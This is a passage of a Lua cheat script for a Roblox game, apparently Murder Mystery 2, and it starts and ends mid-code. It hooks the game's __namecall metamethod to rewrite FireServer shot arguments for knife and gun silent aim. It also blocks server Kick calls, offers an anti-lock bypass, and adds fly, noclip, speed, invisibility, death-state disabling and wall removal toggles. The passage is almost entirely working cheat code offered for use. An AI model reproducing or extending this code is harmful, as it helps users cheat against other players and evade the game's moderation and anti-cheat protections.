                    args[1] = CFrame.new(predict)
                    args[2] = CFrame.new(AimPos)
                end
            end

            return self.FireServer(self, unpack(args))
        end
        
        if self.Name == "Shoot" and method == "FireServer" then
            if not DConfiguration.Combat.SilentAim.GunShot.Enabled then
                return NamecallHook(self, ...)
            end

            local char = LocalPlayer.Character
            if not char or not char:FindFirstChild("Gun") or not char:FindFirstChild("HumanoidRootPart") then
                return NamecallHook(self, ...)
            end

            local origin = char.HumanoidRootPart.Position
            local targets = SheriffTarget()
            if not targets or #targets == 0 then
                return self.FireServer(self, unpack(args))
            end

            local nearest, nearestDist = nil, math.huge
            for _, t in ipairs(targets) do
                if t and t.Character and t.Character.PrimaryPart and InCircle(t.Character) then
                    local Root = t.Character.PrimaryPart
                    local dist = (origin - Root.Position).Magnitude
                    if dist < nearestDist then
                        nearest = t
                        nearestDist = dist
                    end
                end
            end

            if not nearest then
                return self.FireServer(self, unpack(args))
            end

            local Character = nearest.Character
            local Root = Character and Character.PrimaryPart
            if not Root then
                return self.FireServer(self, unpack(args))
            end

            local FuturePos = DFunctions.PredictGun(Character)
            if FuturePos then
                if DConfiguration.Combat.SilentAim.GunShot.InstantShoot then
                    local cf = Root.CFrame
                    
                    local forwardOffset = (math.random() - 0.5) * 2
                    local sideOffset = (math.random() - 0.5) * 1.5
                    local upOffset = (math.random() - 0.5) * 0.6
                    
                    local predict = Root.Position + (cf.LookVector * forwardOffset) + (cf.RightVector * sideOffset) + (cf.UpVector * upOffset)
                    args[1] = CFrame.new(predict)
                    args[2] = CFrame.new(FuturePos)
                else
                    args[1] = CFrame.new(char.RightHand.Position)
                    args[2] = CFrame.new(FuturePos)
                end
            end

            return self.FireServer(self, unpack(args))
        end
    end

    return NamecallHook(self, ...)
end)

local Toggle = Tabs.Combat:AddToggle("KnifeSilentAim", {Title = "Knife Silent Aim", Default = false })

Toggle:OnChanged(function(value)
     DConfiguration.Combat.SilentAim.Throwing.Enabled = value
end)

local Toggle = Tabs.Combat:AddToggle("ThrowingWallCheck", {Title = "Wall Check", Default = false })

Toggle:OnChanged(function(value)
     DConfiguration.Combat.SilentAim.Throwing.WallCheck = value
end)

local Dropdown = Tabs.Combat:AddDropdown("ThrowSpeedType", {
        Title = "Throw Speed",
        Values = {"Normal", "Fast", "Instant"},
        Multi = false,
        Default = 1,
    })

    Dropdown:OnChanged(function(Value)
        DConfiguration.Combat.SilentAim.Throwing.ThrowSpeed = Value
    end)
    
local Dropdown = Tabs.Combat:AddDropdown("KnifePredictionType", {
        Title = "Knife Prediction Type",
        Values = {"Traject", "Vectora", "Dartix"},
        Multi = false,
        Default = 1,
    })

    Dropdown:OnChanged(function(Value)
        DConfiguration.Combat.SilentAim.Throwing.Type = Value
    end)
    
Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
 
local Toggle = Tabs.Combat:AddToggle("GunSilentAim", {Title = "Gun Silent Aim", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.SilentAim.GunShot.Enabled = value
end)

local Toggle = Tabs.Combat:AddToggle("GunInstantShoot", {Title = "Instant Shoot", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.SilentAim.GunShot.InstantShoot = value
end)

local Toggle = Tabs.Combat:AddToggle("GunWallCheck", {Title = "Wall Check", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Combat.SilentAim.GunShot.WallCheck = value
end)

local Dropdown = Tabs.Combat:AddDropdown("GunPredictionType", {
        Title = "Gun Prediction Type",
        Values = {"Vazex", "Phaze", "Hexa", "Nova"},
        Multi = false,
        Default = 1,
    })

    Dropdown:OnChanged(function(Value)
        DConfiguration.Combat.SilentAim.GunShot.Type = Value
    end)
    
 Tabs.Combat:AddParagraph({
        Title = "Settings",
        Content = " "
    })
   
local Toggle = Tabs.Combat:AddToggle("IndicatorMode", {Title = "Show Indicator", Default = false})

Toggle:OnChanged(function(value)
    DConfiguration.Combat.Settings.Indicator = value
    if DConfiguration.Combat.Settings.Indicator then
        IndicatorPart.Transparency = 0.5
	    CreateHighlightESP("IndicatorHL", IndicatorPart, Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 255, 0), true)
    else
	    DestroyHighlightESP("IndicatorHL", IndicatorPart)
	    IndicatorPart.Transparency = 1
    end

    while task.wait(0.01) and DConfiguration.Combat.Settings.Indicator do
        spawn(DFunctions.ShowIndicator)
    end
end)

local Toggle = Tabs.Combat:AddToggle("PredictJump", {Title = "Predict Jump", Default = false })

Toggle:OnChanged(function(value)
      DConfiguration.Combat.Settings.PredictJump = value
end)

local Toggle = Tabs.Combat:AddToggle("ResolverAssistant", {Title = "Resolver Assistant (BETA)", Description = "Preventing shooting at the ground, roof and other side of the walls.", Default = false })

Toggle:OnChanged(function(value)
      DConfiguration.Combat.Settings.ResolverAssistant = value
end)

local Toggle = Tabs.Combat:AddToggle("BypassAntiLock", {Title = "Bypass Anti Lock", Default = false })

Toggle:OnChanged(function(value)
      DConfiguration.Combat.Settings.AntiLockDetection = value
end)

local Dropdown = Tabs.Combat:AddDropdown("TargetCheckType", {
        Title = "Target Check Type",
        Values = {"Circle", "Nearest"},
        Multi = false,
        Default = 2,
    })

    Dropdown:OnChanged(function(Value)
        DConfiguration.Combat.Settings.TargetCheckType = Value
    end)

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
 Tabs.Combat:AddInput("GunPredictionScaleX", {
        Title = "Gun Horizontal Prediction Scale",
        Default = "1.05",
        Placeholder = "Input",
        Numeric = false, 
        Finished = false, 
        Callback = function(Value)
            DConfiguration.Combat.Settings.OffsetMultiplier.Gun.X = tonumber(Value) or 1.05
        end
    })
    
 Tabs.Combat:AddInput("GunPredictionScaleY", {
        Title = "Gun Vertical Prediction Scale",
        Default = "1.0",
        Placeholder = "Input",
        Numeric = false, 
        Finished = false, 
        Callback = function(Value)
            DConfiguration.Combat.Settings.OffsetMultiplier.Gun.Y = tonumber(Value) or 1.0
        end
    })
    
Tabs.Combat:AddInput("KnifePredictionScaleX", {
        Title = "Knife Horizontal Prediction Scale",
        Default = "1.25",
        Placeholder = "Input",
        Numeric = false, 
        Finished = false, 
        Callback = function(Value)
            DConfiguration.Combat.Settings.OffsetMultiplier.Knife.X = tonumber(Value) or 1.25
        end
    })
    
 Tabs.Combat:AddInput("KnifePredictionScaleY", {
        Title = "Knife Vertical Prediction Scale",
        Default = "0.75",
        Placeholder = "Input",
        Numeric = false, 
        Finished = false, 
        Callback = function(Value)
            DConfiguration.Combat.Settings.OffsetMultiplier.Knife.Y = tonumber(Value) or 0.75
        end
    })
    
Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("HeadPrediction", {Title = "Head Prediction", Default = false })

Toggle:OnChanged(function(value)
      DConfiguration.Combat.Settings.HeadPrediction.Enabled = value
end)

 Tabs.Combat:AddInput("HeadShotChance", {
        Title = "Hit Chance",
        Default = "50",
        Placeholder = "Input",
        Numeric = false, 
        Finished = false, 
        Callback = function(Value)
            DConfiguration.Combat.Settings.HeadPrediction.HitChance = tonumber(Value) or 50
        end
    })
    
Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
local Toggle = Tabs.Combat:AddToggle("PingBased", {Title = "Ping Based", Default = false })

Toggle:OnChanged(function(value)
      DConfiguration.Combat.Settings.PingBased.Enabled = value
end)

local Toggle = Tabs.Combat:AddToggle("LatencyMode", {Title = "Latency Mode", Description = "Uses Current Ping.", Default = false })

Toggle:OnChanged(function(value)
      DConfiguration.Combat.Settings.PingBased.LatencyMode = value
end)

local Dropdown = Tabs.Combat:AddDropdown("PingType", {
        Title = "Ping Type",
        Values = {"Server", "Client", "Adaptive"},
        Multi = false,
        Default = 1,
    })

Dropdown:OnChanged(function(Value)
    DConfiguration.Combat.Settings.PingBased.Type = Value
end)

 Tabs.Combat:AddInput("PingInterval", {
        Title = "Ping Interval",
        Default = "100",
        Placeholder = "Input",
        Numeric = false, 
        Finished = false, 
        Callback = function(Value)
            DConfiguration.Combat.Settings.PingBased.Interval = tonumber(Value) or 100
        end
    })

Tabs.Combat:AddParagraph({
        Title = " ",
        Content = ""
    })
    
Tabs.Combat:AddDropdown("CirclePostionType", {
        Title = "Circle Position Type",
        Values = {"Center", "Mouse", "Touch"},
        Multi = false,
        Default = 1,
        Callback = function(Value)
	        DConfiguration.Combat.Settings.Circle.PositionType = Value 
        end
    })

Tabs.Combat:AddSlider("CircleRadius", {
    Title = "Circle Radius",
    Description = "",
    Default = 250,
    Min = 0,
    Max = 1000,
    Rounding = 0,
    Callback = function(CircleSize)
        DConfiguration.Combat.Settings.Circle.Radius = CircleSize or 250
        circle.Radius = DConfiguration.Combat.Settings.Circle.Radius
    end
})

Tabs.Combat:AddColorpicker("CircleColor1", {
        Title = "Circle Color 1",
        Default = Color3.fromRGB(80, 180, 255),
        Callback = function(Value)
	        DConfiguration.Combat.Settings.Circle.Color1 = Value
        end
    })
    
Tabs.Combat:AddColorpicker("CircleColor2", {
        Title = "Circle Color 2",
        Default = Color3.fromRGB(255, 255, 255),
        Callback = function(Value)
	        DConfiguration.Combat.Settings.Circle.Color2 = Value
        end
    })
    
Tabs.Combat:AddToggle("ShowCircle",{
	Title = "Show Circle",
    Default = false,
    Callback = function(Value)
	    circle.Visible = Value
    end
})

wait(Duration)

-- Misc

local Toggle = Tabs.Misc:AddToggle("AntiAfk", {Title = "Anti-AFK", Default = true })

Toggle:OnChanged(function()
	local vu = game:GetService("VirtualUser")
    repeat wait() until game:IsLoaded() 
		game:GetService("Players").LocalPlayer.Idled:connect(function()
        game:GetService("VirtualUser"):ClickButton2(Vector2.new())
			vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		    wait(1)
	    	vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        end)
 end)
 
 local Toggle = Tabs.Misc:AddToggle("TwoLivesmode", {Title = "Two Lives", Default = false })

Toggle:OnChanged(function(State)
   DConfiguration.Misc.TwoLives = State
   if not LocalPlayer.Character then return end
   
   if State then
      LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
   else
      LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
   end
   
    while wait(0.5) and DConfiguration.Misc.TwoLives do
       spawn(DFunctions.TwoLivesMode)
    end
end)

local Toggle = Tabs.Misc:AddToggle("AirJump", {Title = "Air Jump", Default = false })

Toggle:OnChanged(function(State)
    DConfiguration.Misc.AirJump = State
end)

game:GetService("UserInputService").JumpRequest:Connect(function()
    if DConfiguration.Misc.AirJump then
        LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState("Jumping")
    end
end)




local Toggle = Tabs.Misc:AddToggle("Noclip", {Title = "Noclip", Default = false })

Toggle:OnChanged(function(State)
    DConfiguration.Misc.Noclip = State
    
    while DConfiguration.Misc.Noclip and RunService.RenderStepped:Wait() do
       spawn(DFunctions.NoClip)
    end
end)

do
    local WallData = {
        Enabled = false,
        StoredWalls = {}
    }

    local function ToggleWalls(state)
        if state then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") and (v.Transparency >= 1 or v.Name:lower():find("clip")) and v.CanCollide then
                    table.insert(WallData.StoredWalls, v)
                    v.CanCollide = false
                end
            end
        else
            for _, v in pairs(WallData.StoredWalls) do
                if v and v.Parent then
                    v.CanCollide = true
                end
            end
            WallData.StoredWalls = {}
        end
    end

    Tabs.Misc:AddToggle("InvisibleWalls", {
        Title = "Delete Invisible Walls",
        Default = false,
        Callback = function(Value)
            WallData.Enabled = Value
            ToggleWalls(Value)
        end
    })

    task.spawn(function()
        while task.wait(5) do
            if WallData.Enabled then
                ToggleWalls(true)
            end
        end
    end)
end

Tabs.Misc:AddToggle("SafePlatform", {
    Title = "Anti-Void",
    Description = "",
    Default = false,
    Callback = function(Value)
        _G.VoidPlatformActive = Value
        
        if Value then
            game.Workspace.FallenPartsDestroyHeight = -999999
           
            task.spawn(function()
                local player = game.Players.LocalPlayer
                local platform = nil
                
                while _G.VoidPlatformActive do
                    local char = player.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    
                    if root then
                        if root.Position.Y < 400 then 
                            if not platform or not platform.Parent then
                                platform = Instance.new("Part")
                                platform.Name = "SafetyRaft"
                                platform.Size = Vector3.new(100, 1, 100)
                                platform.Anchored = true
                                platform.CanCollide = true
                                platform.Color = Color3.fromRGB(255, 0, 0)
                                platform.Transparency = 0.5
                                platform.Parent = game.Workspace
                            end
                            platform.CFrame = CFrame.new(root.Position.X, -500, root.Position.Z)
                        else
                            if platform then
                                platform:Destroy()
                                platform = nil
                            end
                        end
                    end
                    game:GetService("RunService").Heartbeat:Wait()
                end
                if platform then platform:Destroy() end
            end)
        else
            game.Workspace.FallenPartsDestroyHeight = -500
        end
    end
})




Tabs.Misc:AddSection("LocalPlayer Modification")
    
local Toggle = Tabs.Misc:AddToggle("WSToggle", {Title = "Enable Walk Speed", Default = false })

Toggle:OnChanged(function(State)
    DConfiguration.Misc.LocalPlayer.WalkSpeed.Enabled = State
    
    while DConfiguration.Misc.LocalPlayer.WalkSpeed.Enabled and wait() do
       local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
       local Humanoid = Character:WaitForChild("Humanoid")
       
       if Character and Humanoid then
	       Humanoid.WalkSpeed = DConfiguration.Misc.LocalPlayer.WalkSpeed.Value
       end
    end
end)

Tabs.Misc:AddInput("Walkspeed", {
    Title = "Walk Speed",
    Default = "16",
    Placeholder = "number",
    Numeric = false,
    Finished = false,
    Callback = function(speed)
        DConfiguration.Misc.LocalPlayer.WalkSpeed.Value = tonumber(speed) or 16
    end
})

local Toggle = Tabs.Misc:AddToggle("JPToggle", {Title = "Enable Jump Power", Default = false })

Toggle:OnChanged(function(State)
    DConfiguration.Misc.LocalPlayer.JumpPower.Enabled = State
    
    while DConfiguration.Misc.LocalPlayer.JumpPower.Enabled and wait() do
       local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
       local Humanoid = Character:WaitForChild("Humanoid")
       
       if Character and Humanoid then
	       Humanoid.JumpPower = DConfiguration.Misc.LocalPlayer.JumpPower.Value
       end
    end
end)

Tabs.Misc:AddInput("Jumppower", {
    Title = "Jump Power",
    Default = "50",
    Placeholder = "number",
    Numeric = false,
    Finished = false,
    Callback = function(jpower)
        DConfiguration.Misc.LocalPlayer.JumpPower.Value = tonumber(jpower) or 50
    end
})

local FLYING = false
local velocityHandlerName = "VelocityHandler"
local gyroHandlerName = "GyroHandler"
local mfly1, mfly2
local currentCharacter

local function getRoot(character)
    return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
end

local function unmobilefly(player)
    pcall(function()
        FLYING = false
        local character = player.Character
        if character then
            local root = getRoot(character)
            if root then
                local velocityHandler = root:FindFirstChild(velocityHandlerName)
                local gyroHandler = root:FindFirstChild(gyroHandlerName)

                if velocityHandler then
                    velocityHandler:Destroy()
                end

                if gyroHandler then
                    gyroHandler:Destroy()
                end

                local humanoid = character:FindFirstChildWhichIsA("Humanoid")
                if humanoid then
                    humanoid.PlatformStand = false
                end
            end
        end

        if mfly1 then
            mfly1:Disconnect()
        end

        if mfly2 then
            mfly2:Disconnect()
        end
    end)
end

local function mobilefly(player, vfly)
    unmobilefly(player)
    FLYING = true

    local character = player.Character
    local root = getRoot(character)

    if character and root then
        local camera = workspace.CurrentCamera
        local v3none = Vector3.new()
        local v3zero = Vector3.new(0, 0, 0)
        local v3inf = Vector3.new(9e9, 9e9, 9e9)

        local controlModule = require(player.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
        local bv = Instance.new("BodyVelocity")
        bv.Name = velocityHandlerName
        bv.Parent = root
        bv.MaxForce = v3zero
        bv.Velocity = v3zero

        local bg = Instance.new("BodyGyro")
        bg.Name = gyroHandlerName
        bg.Parent = root
        bg.MaxTorque = v3inf
        bg.P = 1000
        bg.D = 20

        mfly1 = player.CharacterAdded:Connect(function()
            unmobilefly(player)
            currentCharacter = player.Character
            mobilefly(player, vfly)
        end)

        mfly2 = RunService.RenderStepped:Connect(function()
            root = getRoot(player.Character)
            camera = workspace.CurrentCamera
            if player.Character:FindFirstChildWhichIsA("Humanoid") and root and root:FindFirstChild(velocityHandlerName) and root:FindFirstChild(gyroHandlerName) then
                local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
                local VelocityHandler = root:FindFirstChild(velocityHandlerName)
                local GyroHandler = root:FindFirstChild(gyroHandlerName)

                if VelocityHandler and GyroHandler then
                    VelocityHandler.MaxForce = v3inf
                    GyroHandler.MaxTorque = v3inf

                    if not vfly and humanoid then
                        humanoid.PlatformStand = false
                    end

                    GyroHandler.CFrame = camera.CoordinateFrame
                    VelocityHandler.Velocity = v3none

                    local direction = controlModule:GetMoveVector()
                    if direction.X ~= 0 or direction.Z ~= 0 then
                        local moveVector = Vector3.new(direction.X, 0, direction.Z).unit
                        local rightVector = camera.CFrame.RightVector
                        local forwardVector = camera.CFrame.LookVector

                        local flyDirection = (rightVector * moveVector.X - forwardVector * moveVector.Z).unit

                        VelocityHandler.Velocity = flyDirection * (_G.flySpeed * 20)
                        RunService.RenderStepped:Wait()
                    end
                end
            end
        end)
    end
end

local function toggleFly(player, toggleValue)
    if toggleValue then
        mobilefly(player, true)
    else
        unmobilefly(player)
    end
end

-- Your loop structure
_G.loops = false

local function flyLoop()
    while wait(3) do
        if _G.loops then
            local player = game.Players.LocalPlayer
            if player and player.Character then
                mobilefly(player, true)
            end
        end
    end
end

local Toggle = Tabs.Misc:AddToggle("FlyToggle", { Title = "Enable Fly", Default = false })

Toggle:OnChanged(function()
    local player = game.Players.LocalPlayer
    _G.loops = Toggle.Value
    toggleFly(player, Toggle.Value)
end)

Options.FlyToggle:SetValue(false)

_G.flySpeed = 20  -- Default fly speed

local FlySpeedInput = Tabs.Misc:AddInput("FlySpeedInput", {
    Title = "Fly Speed (ignore about the error)",
    Default = tostring(_G.flySpeed),
    Placeholder = "Enter fly speed",
    Numeric = true,
    Finished = false,
    Callback = function(Value)
        _G.flySpeed = tonumber(Value) or 20
        toggleFly(player, Toggle.Value)
    end
})

-- Start the loop
spawn(flyLoop)

Tabs.Misc:AddSection("Exploit Defense")

local Toggle = Tabs.Misc:AddToggle("AntiFling", { Title = "Anti Fling", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Misc.Exploits.AntiFling = value
    
    while DConfiguration.Misc.Exploits.AntiFling and wait() do
       spawn(DFunctions.AntiFling)
    end
end)

local Toggle = Tabs.Misc:AddToggle("AntiLock", { Title = "Anti Locked", Default = false })

Toggle:OnChanged(function(value)
  DConfiguration.Misc.Exploits.AntiLock = value
  
  while DConfiguration.Misc.Exploits.AntiLock and RunService.Heartbeat:Wait() do
       local Root = LocalPlayer.Character and LocalPlayer.Character.PrimaryPart
   	if Root then
           local oldVelocity = Root.Velocity
	   	Root.Velocity = Vector3.new(oldVelocity.X, -10000, oldVelocity.Z) 
   		RunService.RenderStepped:Wait()
 	      Root.Velocity = Vector3.new(oldVelocity.X, oldVelocity.Y, oldVelocity.Z)
   	end
    end
end)

local Toggle = Tabs.Misc:AddToggle("AntiKick", { Title = "Anti Kick (Client)", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Misc.Exploits.AntiKick = value
end)

local mt = getrawmetatable(game)
setreadonly(mt, false)
local oldNamecall = mt.__namecall

mt.__namecall = function(self, ...)
    local method = getnamecallmethod()
    if DConfiguration.Misc.Exploits.AntiKick and method == "Kick" then
        return
    end
    return oldNamecall(self, ...)
end

setreadonly(mt, true)

Tabs.Misc:AddSection("Alternative Features")

do
    local TimerSettings = {
        X = 0.5,
        Y = 0.1,
        Size = 100,
        Color = Color3.fromRGB(255, 255, 255),
        RainbowActive = false,
        RainbowSpeed = 0.01
    }

    local function UpdateTimerPosition()
        local gui = LocalPlayer.PlayerGui:FindFirstChild("TimerGui")
        if gui and gui:FindFirstChild("TextLabel") then
            local label = gui.TextLabel
            label.AnchorPoint = Vector2.new(0.5, 0.5)
            if not TimerSettings.RainbowActive then
                label.TextColor3 = TimerSettings.Color
            end
            label.Size = UDim2.new(0, TimerSettings.Size, 0, TimerSettings.Size / 2)
            label.Position = UDim2.new(TimerSettings.X, 0, TimerSettings.Y, 0)
        end
    end

    local TimerToggle = Tabs.Misc:AddToggle("TimerNotifier", {Title = "Show Timer", Default = false })
    TimerToggle:OnChanged(function(State)
        DConfiguration.Misc.AlternativeFeatures.ShowTimer = State
        if State then
            if not LocalPlayer.PlayerGui:FindFirstChild("TimerGui") then
                local screenGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
                screenGui.Name = "TimerGui"
                screenGui.ResetOnSpawn = false
                local timerLabel = Instance.new("TextLabel", screenGui)
                timerLabel.BackgroundTransparency = 1 
                timerLabel.TextScaled = true
                timerLabel.Font = Enum.Font.GothamBold
                UpdateTimerPosition()
            end
            task.spawn(function()
                while DConfiguration.Misc.AlternativeFeatures.ShowTimer do
                    local timerPart = game.Workspace:FindFirstChild("RoundTimerPart")
                    local gui = LocalPlayer.PlayerGui:FindFirstChild("TimerGui")
                    if timerPart and gui then
                        local timer = timerPart.SurfaceGui:FindFirstChild("Timer")
                        if timer then gui.TextLabel.Text = timer.Text end
                    end
                    task.wait(0.1)
                end
            end)
        else
            local gui = LocalPlayer.PlayerGui:FindFirstChild("TimerGui")
            if gui then gui:Destroy() end
        end
    end)

    Tabs.Misc:AddSlider("TimerX", {
        Title = "Position X", Default = 0.5, Min = 0, Max = 1, Rounding = 2,
        Callback = function(Value) TimerSettings.X = Value UpdateTimerPosition() end
    })
    Tabs.Misc:AddSlider("TimerY", {
        Title = "Position Y", Default = 0.1, Min = 0, Max = 1, Rounding = 2,
        Callback = function(Value) TimerSettings.Y = Value UpdateTimerPosition() end
    })
    Tabs.Misc:AddSlider("TimerSize", {
        Title = "Size", Default = 100, Min = 50, Max = 500, Rounding = 0,
        Callback = function(Value) TimerSettings.Size = Value UpdateTimerPosition() end
    })

    Tabs.Misc:AddColorpicker("TimerColor", {
        Title = "Color", Default = TimerSettings.Color,
        Callback = function(Value) TimerSettings.Color = Value UpdateTimerPosition() end
    })

    Tabs.Misc:AddSlider("RainbowSpeed", {
        Title = "Rainbow Speed", Default = 0.01, Min = 0.001, Max = 0.1, Rounding = 3,
        Callback = function(Value) TimerSettings.RainbowSpeed = Value end
    })

    local RainbowToggle = Tabs.Misc:AddToggle("TimerRainbow", {Title = "Rainbow Timer", Default = false })
    RainbowToggle:OnChanged(function(State)
        TimerSettings.RainbowActive = State
        if State then
            task.spawn(function()
                local hue = 0
                while TimerSettings.RainbowActive do
                    hue = hue + TimerSettings.RainbowSpeed
                    if hue > 1 then hue = 0 end
                    local gui = LocalPlayer.PlayerGui:FindFirstChild("TimerGui")
                    if gui and gui:FindFirstChild("TextLabel") then
                        gui.TextLabel.TextColor3 = Color3.fromHSV(hue, 0.8, 1)
                    end
                    task.wait(0.05)
                end
            end)
        else
            UpdateTimerPosition()
        end
    end)
end


Tabs.Misc:AddParagraph({
        Title = " ",
        Content = ""
    })

Tabs.Misc:AddDropdown("EmoteDropdown", {
    Title = "Select Emote",
    Values = {"Zen", "Dab", "Sit", "Headless", "Ninja", "Zombie", "Floss"},
    Multi = false,
    Default = "Zen",
    Callback = function(Value)
	    DConfiguration.Misc.AlternativeFeatures.EmoteSelected = Value
    end
})

Tabs.Misc:AddButton({
        Title = "Play Emote",
        Description = "",
        Callback = function()
           Remotes.Misc.PlayEmote:Fire(string.lower(DConfiguration.Misc.AlternativeFeatures.EmoteSelected))
    end
})




Tabs.Misc:AddSection("Optimization")
    
local Toggle = Tabs.Misc:AddToggle("OptimizePets", {Title = "Optimize Pets", Default = false })

Toggle:OnChanged(function(value)
    LocalPlayer.PlayerScripts.Pets.Disabled = value
end)
    
local Toggle = Tabs.Misc:AddToggle("OptimizeCoins", {Title = "Optimize Coins", Default = false })

Toggle:OnChanged(function(value)
    LocalPlayer.PlayerScripts.CoinVisualizer.Disabled = value
end)

local Toggle = Tabs.Misc:AddToggle("OptimizeChromas", {Title = "Optimize Chromas", Default = false })

Toggle:OnChanged(function(value)
    LocalPlayer.PlayerScripts.WeaponVisuals.ChromaScript.Disabled = value
end)

Tabs.Misc:AddParagraph({
        Title = " ",
        Content = ""
    })

local Toggle = Tabs.Misc:AddToggle("RemoveEquipments", {Title = "Remove Display Equipment", Default = false })

    Toggle:OnChanged(function(value)
     DConfiguration.Misc.Removal.DisplayEquipment = value
     
     while DConfiguration.Misc.Removal.DisplayEquipment do
        for i,v in pairs (workspace:GetDescendants()) do
            if v.Name == "Pet" then
                v:Destroy()
            elseif v.Name == "KnifeDisplay" then
                v:Destroy()
            elseif v.Name == "GunDisplay" then
                v:Destroy()
            end
        end
        wait(10)
    end
    end)
    
local Toggle = Tabs.Misc:AddToggle("RemoveBodies", {Title = "Remove Dead Bodies", Default = false })

    Toggle:OnChanged(function(value)
        DConfiguration.Misc.Removal.DeadBodies = value
    
        while DConfiguration.Misc.Removal.DeadBodies do
            for i,v in pairs (workspace:GetDescendants()) do
                if v.Name == "Raggy" then
                    v:Destroy()
                end
            end
            wait(10)
       end
    end)

Tabs.Misc:AddSection("Spectation")

local Toggle = Tabs.Misc:AddToggle("SpectatePlayer", {Title = "Spectate Player", Default = false })

Toggle:OnChanged(function(value)
    DConfiguration.Misc.Spectate.Enabled = value
    
    while DConfiguration.Misc.Spectate.Enabled and wait() do
	    DFunctions.SpectatePlayer(DConfiguration.Misc.Spectate.Target)
    end
    
    if not DConfiguration.Misc.Spectate.Enabled then
        Camera.CameraSubject = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
    end
end)

local SpectateDropdown = Tabs.Misc:AddDropdown("SpectatingDropDown", {
    Title = "Select Player to Spectate",
    Values = DFunctions.GetOtherPlayers(),
    Multi = false,
    Default = "",
})

SpectateDropdown:OnChanged(function(Value)
    DConfiguration.Misc.Spectate.Target = Value
end)
    
Tabs.Misc:AddButton({
        Title = "Refresh Dropdown",
        Description = "",
        Callback = function()
        SpectateDropdown.Values = DFunctions.GetOtherPlayers()
        wait(0.2)
        SpectateDropdown:SetValue("")
    end
})

Tabs.Misc:AddButton({
        Title = "Spectate Murderer",
        Description = " ",
        Callback = function()
           DConfiguration.Misc.Spectate.Target = Roles.Murderer
    end
})

Tabs.Misc:AddButton({
        Title = "Spectate Sheriff",
        Description = " ",
        Callback = function()
            if Roles.Sheriff then
               DConfiguration.Misc.Spectate.Target = Roles.Sheriff
            elseif Roles.Hero then
               DConfiguration.Misc.Spectate.Target = Roles.Hero
         end
    end
})

wait(Duration)

Tabs.Misc:AddSection("Manipulations")

local function UpdateInvisButton()
    if DConfiguration.Misc.Manipulation.Invisible.FloatingButton ~= nil then
        local size = 0.1 + DConfiguration.Settings.GuiScale.Invisible
        
        if not game:GetService("CoreGui"):FindFirstChild("InvisibleButton") then
            DFunctions.CreateButton("InvisibleButton", DConfiguration.Misc.Manipulation.Invisible.FloatingButton and "Invisible: ON" or "Invisible: OFF", size, size, function(btn)
                DConfiguration.Misc.Manipulation.Invisible.FloatingButton = not DConfiguration.Misc.Manipulation.Invisible.FloatingButton
                btn.Text = DConfiguration.Misc.Manipulation.Invisible.FloatingButton and "Invisible: ON" or "Invisible: OFF"
                
                if DConfiguration.Misc.Manipulation.Invisible.FloatingButton then
                    local SavedPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-25.95, 84, 3537.55))
                    task.wait(0.15)
                    
                    local seat = Instance.new("Seat")
                    seat.Name = "invischair"
                    seat.Anchored = false
                    seat.CanCollide = false
                    seat.Transparency = 1
                    seat.Position = Vector3.new(-25.95, 84, 3537.55)
                    seat.Parent = workspace
                    
                    local weld = Instance.new("Weld")
                    weld.Part0 = seat
                    weld.Part1 = game.Players.LocalPlayer.Character:FindFirstChild("Torso") or game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso")
                    weld.Parent = seat

                    task.wait()
                    seat.CFrame = SavedPosition
                    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v.Name ~= "HumanoidRootPart" and v:IsA("BasePart") then
                            v.Transparency = 0.5
                        end
                    end
                else
                    for i, v in pairs(workspace:GetChildren()) do
                        if v.Name == "invischair" then
                            v:Destroy()
                        end
                    end
                    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v.Name ~= "HumanoidRootPart" and v:IsA("BasePart") then
                            v.Transparency = 0
                        end
                    end
                end
            end)
        else
            DFunctions.UpdateButton("InvisibleButton", size, size)
        end
    end
end

Tabs.Misc:AddInput("InvisButtonSize", {
    Title = "Invisible Button Size",
    Default = tostring(DConfiguration.Settings.GuiScale.Invisible),
    Placeholder = "0",
    Numeric = true,
    Finished = false,
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            DConfiguration.Settings.GuiScale.Invisible = num * 0.01
        else
            DConfiguration.Settings.GuiScale.Invisible = 0
        end
        
        local size = 0.1 + DConfiguration.Settings.GuiScale.Invisible
        DFunctions.UpdateButton("InvisibleButton", size, size)
    end
})

local Toggle = Tabs.Misc:AddToggle("InvisibleButtonToggle", {Title = "Invisible Button", Default = false })

Toggle:OnChanged(function(value)
    if value then
        DConfiguration.Misc.Manipulation.Invisible.FloatingButton = false
        UpdateInvisButton()
    else
        DConfiguration.Misc.Manipulation.Invisible.FloatingButton = nil
        DFunctions.DestroyButton("InvisibleButton")
    end
end)


Tabs.Misc:AddParagraph({
        Title = " ",
        Content = ""
    })

local function SafeFling(target)
